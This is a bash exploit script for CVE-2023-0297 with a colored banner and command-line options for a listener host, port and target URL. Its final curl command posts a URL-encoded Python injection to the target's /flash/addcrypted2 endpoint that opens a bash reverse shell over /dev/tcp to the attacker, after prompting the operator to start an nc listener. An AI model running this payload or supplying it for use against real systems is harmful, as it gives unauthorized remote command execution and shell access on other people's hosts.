#!/bin/bash

#Color variables
RED="\e[31m "
GREEN="\e[32m "
YELLOW="\e[33m "
BLUE="\e[34m "
MAGENTA="\e[35m "
CYAN="\e[36m "
RESET="\e[0m "

echo -e $RED"    	 _____ _____  _____    ________   ___     _____  ___ ______ "
echo -e $CYAN"   	|  _  |  __ \/  __ \   | ___ \ \ / / |   |  _  |/ _ \|  _  \\"
echo -e $MAGENTA"	| | | | |  \/| /  \/   | |_/ /\ V /| |   | | | / /_\ \ | | |"
echo -e $YELLOW" 	| | | | | __ | |       |  __/  \ / | |   | | | |  _  | | | |"
echo -e $BLUE"   	\ \_/ / |_\ \| \__/\   | |     | | | |___\ \_/ / | | | |/ / "
echo -e $GREEN"  	 \___/ \____/ \____/   \_|     \_/ \_____/\___/\_| |_/___/  "$RESET	
echo ""                                                      
                                                       

############################################################
# Help                                                     #
############################################################
Help()
{
   # Display Help
   echo "-l     LHOST"
   echo "-p     LPORT"
   echo "-w     WEBSITE"
   echo "Syntax: CVE-2023-0297.sh -l <lhost> -p <lport> -w <WEBHOST>"
   echo "ex:  ./CVE-2023-0297.sh -l 10.10.10.10 -p 4444 -w http://127.0.0.1:8000"
}


############################################################
# Process the input options. Add options as needed.        #
############################################################
# Get the options
while getopts "l:p:w:h" option; do
   case $option in
   	h) # display Help
	    Help
        exit;;
    l) # LHOST
		LHOST=${OPTARG};;
	p) # LPORT
		LPORT=${OPTARG};;
	w) # WEBHOST
		WEBHOST=${OPTARG};;
   esac
done

############################################################
# If no options are passed do the following        		   #
############################################################

if [ $# -eq 0 ]; then
    >&2 echo -e "$YELLOW" "No arguments provided"
    >&2 echo -e "$GREEN" "Use -h for help"
    >&2 echo -e "$CYAN" 'Syntax: CVE-2023-0297.sh -l <lhost> -p <lport> -w <WEBHOST>'
    >&2 echo -e "$RED" "ex: ./CVE-2023-0297.sh -l 10.10.10.10 -p 4444 -w http://127.0.0.1:8000"
    exit 1
fi

#ALL THANKS TO DZE64 FOR THIS ONE...
echo -e $RED ""
read -p "Run nc -lvnp ${LPORT}, press enter to continue"
echo -e $RESET	
curl -i -s -k -X POST --data-binary "jk=pyimport%20os;os.system(\"bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F${LHOST}%2F${LPORT}%200%3E%261%27\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa"  "${WEBHOST}/flash/addcrypted2"
